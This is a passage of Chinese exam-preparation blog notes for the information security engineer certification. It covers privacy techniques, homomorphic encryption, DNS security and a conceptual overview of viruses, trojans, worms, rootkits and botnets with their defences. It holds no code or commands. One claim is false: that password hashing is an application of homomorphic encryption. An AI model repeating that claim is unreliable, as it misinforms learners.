style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿分散存储</li><li>多样性设计：避免单一组件风险</li></ul></li></ul><h3 id="应用">应用</h3><ul><li>弹性CA系统：<ul><li>背景：CA私钥泄露会导致PKI体系崩溃</li><li>方案：采用门限密码技术，将私钥﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span></span></span></span>﻿分解为﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>=</mo><msub><mi>d</mi><mn>1</mn></msub><mo>+</mo><msub><mi>d</mi><mn>2</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>d</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">d=d_1+d_2+...+d_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿分散存储</li><li>签名流程：客户机向t个服务器发送Hash值﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span></span></span></span>﻿，各服务器返回部分签名结果再组合</li></ul></li><li>区块链技术：<ul><li>特点：去中心化分布式数据库</li><li>优势：节点对等+共识机制保障数据完整性，单点失效不影响整体</li></ul></li></ul><h2 id="隐私保护技术">隐私保护技术</h2><h3 id="分类">分类</h3><ul><li>身份隐私：可直接识别真实身份的信息（照片、身份证号）</li><li>属性隐私：描述个人特征的数据（年龄、性别、薪资、购物史）</li><li>社交关系隐私：不愿公开的人际关系</li><li>位置轨迹隐私：非自愿公开的行踪信息</li></ul><h3 id="隐私保护技术">隐私保护技术</h3><ul><li><p>核心目标：修改数据使其可公开且保留使用价值</p></li><li><p>主要方法：</p><ul><li><p>k-匿名：泛化处理使元组对应多人（如邮编021**+1940-1950年出生）</p><p><img src="https://image.icewindy.cn/2025/08/1079b22dce4867e907820eeee99ddaf9.png" alt="image-20250820170904334"></p></li><li><p>差分隐私：添加随机噪声干扰数据推导</p></li></ul></li><li><p>技术措施：</p><ul><li>抑制：数据置空（如敏感字段留白）</li><li>泛化：降低精度（年龄→年龄段）</li><li>置换：更改属主关系（假名处理）</li><li>裁剪：分开发布敏感数据（如比特币密钥分段存储）</li><li>扰动：添加噪声（数据增删/变换）</li></ul></li></ul><h3 id="应用">应用</h3><ul><li>匿名化处理：<ul><li>方法：替换关键标识符（姓名→&quot;张小姐&quot;，身份证号→****）</li><li>要求：处理后的信息不可复原</li></ul></li><li>去标识化技术：<ul><li>假名：综艺节目使用&quot;小王&quot;代称</li><li>加密/Hash：存储密码哈希值（如﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mi>a</mi><mi>s</mi><mi>h</mi><mo stretchy="false">(</mo><mtext>密码</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">hash(密码)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord cjk_fallback">密</span><span class="mord cjk_fallback">码</span><span class="mclose">)</span></span></span></span>﻿）</li></ul></li><li>系统敏感数据保护：<ul><li>应用场景：路由器配置、系统口令文件</li><li>典型措施：操作系统/数据库口令经Hash处理后存储</li></ul></li></ul><h2 id="网络安全前沿技术发展动向">网络安全前沿技术发展动向</h2><h3 id="网络威胁情报服务">网络威胁情报服务</h3><ul><li>情报内容: 包括安全漏洞、攻击来源IP地址、恶意邮箱、恶意域名、攻击工具等关键安全要素。</li></ul><h3 id="同态加密技术">同态加密技术</h3><ul><li>核心定义:<ul><li>数学特性: 指加密函数满足﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>a</mi><mo stretchy="false">)</mo><mo>⊕</mo><mi>E</mi><mo stretchy="false">(</mo><mi>b</mi><mo stretchy="false">)</mo><mo>=</mo><mi>E</mi><mo stretchy="false">(</mo><mi>a</mi><mo>⊕</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E(a) \oplus E(b) = E(a \oplus b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span>﻿，对密文运算结果与明文直接运算等价</li><li>技术本质: &quot;加密后处理=处理后再解密&quot;的特殊加密方式</li></ul></li><li>应用场景:<ul><li>第三方数据处理: 委托不可信方处理数据时（如外包服务），通过密文运算保护原始信息</li><li>云端存储安全: 敏感信息存储远程服务器时，既防止本地泄密又保持数据可用性（如密码哈希存储）</li></ul></li><li>典型案例: 密码哈希技术属于同态加密的实践应用，即使哈希值泄露也无法还原明文，但可正常用于身份认证</li></ul><h3 id="域名服务安全保障">域名服务安全保障</h3><ul><li>主要风险:<ul><li>篡改攻击: 利用域名解析系统、WHOIS等环节漏洞修改解析数据</li><li>配置错误: 权威DNS服务器配置不当导致服务中断</li><li>劫持攻击: 通过控制域名管理凭证，将NS记录指向恶意服务器</li><li>软件漏洞: BIND等DNS服务软件自身安全缺陷</li></ul></li><li>解决方案:<ul><li>LDNS Cloud服务:<ul><li>提供DNS托管、灾备、流量管理、抵抗大规模DDoS攻击和DNS劫持安全等全套服务</li><li>具备抗DDoS和防劫持能力</li></ul></li><li>DNSSEC协议:<ul><li>由IETF提出的安全扩展方案</li><li>核心功能：数据源认证+完整性验证</li><li>通过数字签名防止DNS欺骗攻击</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 软考 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全工程师软考（14）：恶意代码</title>
      <link href="/2025/08/15/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%8814%EF%BC%89%EF%BC%9A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
      <url>/2025/08/15/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%8814%EF%BC%89%EF%BC%9A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<ul><li>恶意代码Malicious Code</li><li>病毒Virus</li><li>蠕虫Worms</li><li>特洛伊木马Trojan Horse</li><li>逻辑炸弹Logic Bombs</li><li>细菌Bacteria</li><li>恶意脚本Malicious Scripts</li><li>间谍软件Spyware</li></ul><h2 id="恶意代码概述">恶意代码概述</h2><h3 id="分类">分类</h3><ul><li>被动传播:<ul><li>病毒、木马、间谍软件、逻辑炸弹</li><li>特点：需要用户交互触发（如运行带毒文件）</li></ul></li><li>主动传播:<ul><li>网络蠕虫（典型代表，具有自主传播能力）</li><li>现代病毒可能兼具主动传播特性</li></ul></li></ul><h3 id="攻击模型">攻击模型</h3><img src="https://image.icewindy.cn/2025/08/d0810b7f963a6fa2b8b9c66b55d5b550.png" alt="image-20250818154128041" style="zoom:50%;" /><ol><li>侵入系统<ul><li>感染途径:<ul><li>下载携带恶意代码的程序（如破解软件）</li><li>恶意邮件附件（如钓鱼邮件中的.doc文件）</li><li>移动介质传播（U盘/光盘自动运行）</li><li>系统预装植入（非官方系统镜像风险）</li></ul></li></ul></li><li>维持或提升权限<ul><li>核心目标: 获取更高权限（如从普通用户提权至管理员）</li><li>实现方式: 利用系统漏洞或密码窃取技术</li></ul></li><li>隐蔽<ul><li>常见手段:<ul><li>修改文件名/扩展名伪装（如.exe伪装为.txt）</li><li>删除原始感染文件</li><li>关闭安全软件（如禁用杀毒服务）</li></ul></li></ul></li><li>潜伏<ul><li>触发条件:<ul><li>时间触发（如60天后激活）</li><li>感染规模触发（如感染40%主机后爆发）</li><li>典型实例：勒索病毒的延迟爆发策略</li></ul></li></ul></li><li>破坏<ul><li>攻击维度:<ul><li>数据窃取（破坏机密性）</li><li>系统篡改（破坏完整性）</li><li>服务拒绝（破坏可用性）</li></ul></li></ul></li><li>重复<ul><li>自动化过程: 重复①-⑤步实现持续感染扩散</li></ul></li></ol><h3 id="恶意代码生存技术">恶意代码生存技术</h3><img src="https://image.icewindy.cn/2025/08/ee9d136e5754608eb65837dca00351a4.png" alt="image-20250818154414151" style="zoom: 50%;" /><img src="https://image.icewindy.cn/2025/08/210c3fd741b556003b29d046c7bf6173.png" alt="image-20250818155709617" style="zoom:50%;" /><img src="https://image.icewindy.cn/2025/08/2332bee76fd99cc18ba870968c97ad27.png" alt="image-20250818160645659" style="zoom:50%;" /><h3 id="恶意代码攻击技术">恶意代码攻击技术</h3><ul><li>进程注入：将恶意代码注入系统/网络服务实现隐蔽运行，只需安装一次即可持续活跃。典型特征是&quot;寄生&quot;于合法进程。</li><li>超级管理：通过攻击反恶意代码软件（如关闭杀毒软件）实现隐蔽。考试重点：题干描述&quot;使安全软件瘫痪&quot;即指向该技术。</li><li>端口反向连接：利用防火墙&quot;内松外紧&quot;特性，由被控端主动连接控制端。</li><li>缓冲区溢出：利用程序漏洞获取控制权，使传播方式从被动变主动。</li></ul><h3 id="恶意代码分析技术">恶意代码分析技术</h3><img src="https://image.icewindy.cn/2025/08/16c4a5d06e2af9d9791ebb1266aa5f96.png" alt="image-20250818162737312" style="zoom:67%;" /><h4 id="静态分析">静态分析</h4><ul><li>反恶意代码检测：<ul><li>特征代码法：比对已知恶意代码特征</li><li>校验和法：通过哈希值比对文件完整性（如注册表校验）</li><li>行为监测法：监控可疑行为模式</li><li>软件模拟法：虚拟环境运行检测</li></ul></li><li>字符串分析：提取样本中的敏感字符串，包括：<ul><li>恶意代码名称/作者信息</li><li>后门密码/关联网址</li><li>调用库函数特征</li></ul></li><li>脚本分析：直接查看JS/Perl/Shell等脚本语言的源代码</li><li>反编译分析：将EXE还原为高级语言代码，可读性较差</li><li>反汇编分析：<ul><li>线性遍历：从入口点顺序反汇编，可能遗漏跳转表数据</li><li>递归遍历：通过控制流指令指导反汇编，解决线性法缺陷</li></ul></li></ul><h4 id="动态分析">动态分析</h4><ul><li>文件监测：追踪恶意代码对文件的增删改操作</li><li>进程监测：监控异常进程创建或权限盗用</li><li>网络监测：使用嗅探器分析传播内容</li><li>注册表监测：监控系统配置数据库的异常修改</li><li>动态反汇编：<ul><li>同内存调试：调试器与恶意代码同地址空间，需修改目标程序地址</li><li>仿真调试：通过虚拟化技术隔离调试，可绕过反跟踪技术但开销大</li></ul></li></ul><h3 id="防范策略">防范策略</h3><img src="https://image.icewindy.cn/2025/08/17920503626487033524c592a4e1f599.png" alt="image-20250818163144649" style="zoom:50%;" /><ul><li><strong>组织管理</strong>：<ul><li>核心是责任落实到人（“有人担责措施才会跟上”）</li><li>包含安全意识培养、安全制度建立等管理措施</li></ul></li><li><strong>技术防御</strong>：<ul><li>预防：杀毒软件部署、系统加固、访问控制</li><li>检测：漏洞扫描、注册表审查</li><li>应急响应：备份恢复、补丁管理</li></ul></li><li>实施要点：符合等保2.0要求，<strong>管理措施与技术措施必须同步实施</strong></li></ul><h2 id="计算机病毒">计算机病毒</h2><ul><li>定义特征：计算机病毒是一组具有<strong>自我复制、传播能力的程序代码</strong>，常依附在可执行文件或文档文件中。</li><li>四大特性：<ul><li>隐蔽性：附加在正常软件中，用户未察觉时触发执行</li><li>传染性：通过自我复制感染无病毒程序或磁盘引导区</li><li>潜伏性：满足触发条件才执行恶意功能</li><li>破坏性：后果不可预测，包括数据丢失、系统瘫痪等</li></ul></li><li>核心组件：<ul><li><strong>复制传染部件(replicator)</strong></li><li><strong>隐藏部件(concealer)</strong></li><li><strong>破坏部件(bomb)</strong></li></ul></li><li>生命周期：<ul><li><strong>复制传播阶段</strong>：持续数周至数年，<strong>主动</strong>搜寻新主机感染</li><li><strong>激活阶段</strong>：根据日期/时间/感染文件数等条件触发破坏</li></ul></li></ul><h3 id="常见类型与技术">常见类型与技术</h3><img src="https://image.icewindy.cn/2025/08/212f75038d28aa65177fb1ea4cb5dd4f.png" alt="image-20250818172515559" style="zoom:50%;" /><h3 id="常见特征码">常见特征码</h3><ul><li>系统病毒：前缀Win32/PE，感染Windows系统的exe或dll文件</li><li>蠕虫病毒：前缀Worm（如冲击波病毒）</li><li>木马病毒：前缀Trojan（如游戏木马）</li><li>脚本病毒：前缀Script（如欢乐时光病毒）</li><li>宏病毒：前缀Macro（如Word97病毒）</li><li>后门病毒：前缀Backdoor（如隐藏账号病毒）</li><li>破坏程序病毒：前缀Harm（如熊猫烧香）</li><li>捆绑机病毒：前缀Binder</li></ul><h3 id="防范策略与技术">防范策略与技术</h3><ul><li>查找计算机病毒源<ul><li>比较法：对比原始备份与检测对象的完整性</li><li>搜索法：扫描特定字节串识别病毒特征</li><li>特征字识别法：抽取关键特征字加速识别</li><li>分析法：逆向分析病毒代码结构</li></ul></li><li>阻断计算机病毒传播途径（<strong>重点</strong>）<ul><li>用户管理：培养安全意识，不运行未知软件</li><li>载体消除：专机专用，禁用外部存储介质</li><li>服务控制：关闭非必要功能（如脚本语言）</li><li>网络隔离：生产网与办公网安全分区</li></ul></li><li>主动查杀计算机病毒<ul><li>定期病毒检测</li><li>建立多级防护体系（如终端+网络层防护）</li></ul></li><li>应急响应和灾备（<strong>重点</strong>）<ul><li>备份：最有效方法，需系统级备份关键数据</li><li>数据修复：部分恢复被破坏文件（如勒索病毒）</li><li>网络过滤：防火墙/AV设备隔离感染主机</li><li>应急预案：制定标准化处置流程</li></ul></li></ul><h3 id="计算机病毒防护方案">计算机病毒防护方案</h3><ul><li>单机防护：终端杀毒软件（最后防线）</li><li>网络防护：集中监控平台+特征库统一更新</li><li>分级防护：终端-局域网-广域网三级管理</li><li>邮件防护：网关处过滤病毒邮件</li><li>网关防护：防火墙联动查杀（不影响带宽）</li></ul><h3 id="应用案例">应用案例</h3><img src="https://image.icewindy.cn/2025/08/00dc3de9a94e214158ce5d071fa02d0c.png" alt="image-20250818174727764" style="zoom: 50%;" /><ul><li><p>基于网络病毒防御的安装部署模式示例图解析</p><ul><li><p>架构特点：</p><ul><li>出口防火墙过滤互联网威胁</li><li>服务器/工作站安装反病毒软件</li><li>控制平台集中管理升级任务</li></ul></li><li><p>优势：减少出口带宽占用（特征库本地分发）</p></li></ul></li><li><p>局域网病毒防御架构示例图解析</p><ul><li><p>三级管理：</p><ul><li>终端杀毒软件实时防护</li><li>监控中心收集威胁情报</li><li>总部平台统管分支机构</li></ul></li><li><p>信息流：通过Email/平台上报病毒事件</p></li></ul></li></ul><h2 id="特洛伊木马">特洛伊木马</h2><ul><li>定义：具有伪装能力、隐蔽执行非法功能的恶意程序，英文简称Trojan Horse。</li><li>传播特性：与病毒和蠕虫不同，木马不具有自我传播能力，而是通过电子邮件附件、文件捆绑等方式传播。</li><li>危害表现：攻击者可远程控制受害计算机，进行文件访问、命令执行或DDoS攻击等操作。</li><li>分类：<ul><li>本地特洛伊木马：仅运行在单台主机，无远程通信功能（如UNIX系统下的盗用口令木马）</li><li>网络特洛伊木马：由远程控制端和代理端组成，具有网络通信功能（当前主流类型）</li></ul></li></ul><h3 id="木马运行机制">木马运行机制</h3><p><img src="https://image.icewindy.cn/2025/08/b94048c69385b80219eec2df4ace173c.png" alt="image-20250819160611983"></p><ul><li>五阶段攻击过程：<ul><li>目标搜寻：通过网络扫描等方式寻找潜在目标</li><li>信息收集：获取目标系统类型、网络结构、应用软件、用户习惯等信息</li><li>木马植入：通过网页点击、邮件附件等途径植入，需分析系统脆弱性</li><li>行为隐藏：包括本地活动隐藏（文件/进程隐藏）和远程通信隐藏</li><li>攻击实施：满足触发条件后执行窃密、远程控制等恶意操作</li></ul></li></ul><h3 id="木马植入技术">木马植入技术</h3><p>特洛伊<strong>木马植入</strong>是木马攻击系统<strong>最关键的一步</strong>。植入的方法可以分为：</p><ul><li>被动植入：<ul><li>特点：依赖用户手工操作，通过<strong>社会工程学伪装成合法程序</strong></li><li>典型方法：<ul><li>文件捆绑法（绑定到常用软件安装包）</li><li>邮件附件法（伪装成合法附件）</li><li>Web网页法（隐藏在HTML文件中）</li></ul></li></ul></li><li>主动植入：<ul><li>特点：无需用户交互，自动完成植入</li><li>技术原理：利用系统漏洞自动部署木马程序</li></ul></li></ul><h3 id="木马隐藏技术">木马隐藏技术</h3><ul><li>本地隐藏：<ul><li>LKM技术：通过动态加载内核模块实现</li><li>具体方法：文件隐藏、进程隐藏、通信连接隐藏</li></ul></li><li>远程隐藏：<ul><li>通信内容加密</li><li>端口复用（如使用80端口）</li><li>网络隐蔽通道</li></ul></li></ul><img src="https://image.icewindy.cn/2025/08/68498ed1a8682b7bc958ca90df1e4610.png" alt="image-20250819161106910" style="zoom:50%;" /><h3 id="木马存活技术">木马存活技术</h3><p>特洛伊木马存活能力取决于网络木马<strong>逃避安全监测能力</strong>。常见的技术包括：</p><ul><li>超级管理技术：可以使杀毒软件失效</li><li>端口反向连接：由内到外发起，逃避防火墙</li></ul><h3 id="木马防范技术">木马防范技术</h3><ul><li>检测技术：<ul><li>端口检测（netstat命令/端口扫描）</li><li>系统文件比对（重点检查自启动文件）</li><li>注册表异常检查</li><li>Rootkit专项检测：<ul><li>特征码检测（仅对已知有效）</li><li>指令路径分析（对比CPU指令执行数）</li><li>内核数据读取（直接检查内核结构）</li></ul></li></ul></li><li>防护措施：<ul><li>网络检测（部署IDS识别木马特征）</li><li>网络阻断（防火墙拦截木马通信）</li><li>系统加固（漏洞修补、完整性保护）</li></ul></li><li>清除方法：<ul><li>手工清除（删除文件/恢复注册表）</li><li>专用工具清除（终止通信/修复系统）</li></ul></li></ul><h3 id="rootkit">Rootkit</h3><p>已获取管理员权限的工具。</p><ul><li>词源：Root（超级管理员）+Kit（工具包）</li><li>技术本质：通过修改内核或指令路径隐藏系统对象</li><li>危害：可隐藏文件、进程、端口等系统关键信息</li></ul><h2 id="网络蠕虫">网络蠕虫</h2><ul><li>定义：网络蠕虫是一种具有自我复制和传播能力、可独立自动运行的恶意程序，综合了黑客技术和计算机病毒技术。</li><li>核心特性：<ul><li>独立运行：与病毒不同，不依赖宿主文件即可独立运行（病毒需依附文件/程序）</li><li>高传播性：利用系统漏洞节点传播，多模式化传播途径导致发生频率高、影响面广</li><li>破坏力强：历史上80%-90%重大攻击事件由蠕虫引发</li></ul></li><li>功能模块：<ul><li>探测模块(Probe)：检测主机脆弱性，建立开放可扩充的传播途径</li><li>传播模块(Transport)：生成蠕虫副本并在主机间传递</li><li>引擎模块(Worm Engine)：搜索算法收集网络拓扑、用户信息等</li><li>负载模块(Payload)：实现蠕虫功能的伪代码</li></ul></li></ul><h3 id="蠕虫运行机制">蠕虫运行机制</h3><ul><li><p>三阶段循环：</p><img src="https://image.icewindy.cn/2025/08/1253297b55cdf0ae27b192e192e756d7.png" alt="image-20250819164127981" style="zoom:50%;" /><ul><li>搜索阶段：感染主机扫描网络寻找易感目标（如开放135/RPC、445/SMB端口的主机）</li><li>传送阶段：将蠕虫代码传输至目标主机</li><li>感染阶段：目标主机执行代码成为新感染源，重复前两阶段</li></ul></li><li><p>传播特点：呈指数级扩散（1→10→100→1000）</p></li></ul><h3 id="蠕虫常用技术">蠕虫常用技术</h3><h4 id="扫描技术">扫描技术</h4><ul><li>随机扫描：对整个IP地址空间随机抽取，感染目标非确定性</li><li>顺序扫描：<ul><li>按本地优先原则扫描子网（如192.168.1.1→192.168.1.254）</li><li>可能重复扫描导致网络拥塞</li></ul></li><li>选择性扫描（重点发展方向）：<ul><li>选择性随机扫描：筛选高概率目标后随机扫描</li><li>基于目标列表扫描：预生成易感主机列表</li><li>基于路由扫描：效率是随机扫描的3.5倍（考试重点）</li><li>基于DNS扫描：利用DNS返回的活跃IP段</li><li>分而治之扫描：分布式分配扫描任务（如主机A扫1.0网段，主机B扫2.0网段）</li></ul></li></ul><h4 id="漏洞利用技术">漏洞利用技术</h4><ul><li>技术类型：<ul><li>信任关系漏洞：利用共享打印机/文件等信任链传播</li><li>程序漏洞：缓冲区溢出攻击（如永恒之蓝利用SMB漏洞）</li><li>默认凭证漏洞：弱口令/空口令</li><li>安全意识漏洞：伪装合法文件诱导点击（通用于病毒/木马）</li><li>客户端配置漏洞：利用自动执行下载程序等缺陷</li></ul></li></ul><h3 id="网络蠕虫防范技术">网络蠕虫防范技术</h3><img src="https://image.icewindy.cn/2025/08/d8dd58fb1069849a850369ab9b7feca9.png" alt="image-20250819171833744" style="zoom: 50%;" /><h2 id="僵尸网络">僵尸网络</h2><ul><li>定义：攻击者通过入侵手段将僵尸程序植入目标计算机，操纵受害机执行恶意活动的网络</li><li>程序本质：与木马高度相似，区别在于僵尸程序兼具远程控制与攻击功能，可视为&quot;具备攻击性的高级木马&quot;</li><li>控制规模：黑客通过服务端集中控制大量感染主机（如100台），形成可操纵的网络资源</li></ul><h3 id="构建方式">构建方式</h3><ul><li>传播途径：<ul><li>远程漏洞攻击</li><li>弱口令扫描入侵</li><li>邮件附件</li><li>恶意文档</li><li>文件共享</li></ul></li><li>共性特征：与蠕虫病毒传播方式高度重合，核心目标是实现恶意代码植入</li></ul><h3 id="运行机制与技术">运行机制与技术</h3><ul><li>三阶段模型：<ul><li>传播阶段：通过前述方式感染目标主机，植入僵尸程序</li><li>组网阶段：建立C&amp;C（命令与控制）通道，将分散主机组成可控网络</li><li>攻击阶段：通过控制服务器下发指令，执行DDoS攻击、密码爆破等恶意活动</li></ul></li><li>攻击多样性：具体攻击行为取决于僵尸程序编写时的功能设计，例如：<ul><li>耗尽带宽型DDoS攻击</li><li>分布式密码爆破攻击</li><li>数据窃取与横向渗透</li></ul></li></ul><h3 id="防范技术">防范技术</h3><ul><li>四层防御体系：<ul><li>威胁监测：<ul><li>蜜罐技术（诱捕攻击行为）</li><li>IDS入侵检测系统</li><li>EDR终端检测响应</li><li>态势感知系统</li></ul></li><li>异常检测：分析CC通信等特征流量，识别僵尸网络行为模式</li><li>主动遏制：<ul><li>路由级IP黑名单</li><li>DNS域名封禁（针对动态IP变换情况）</li></ul></li><li>终端清除：使用杀毒软件等安全工具查杀僵尸程序</li></ul></li></ul><h2 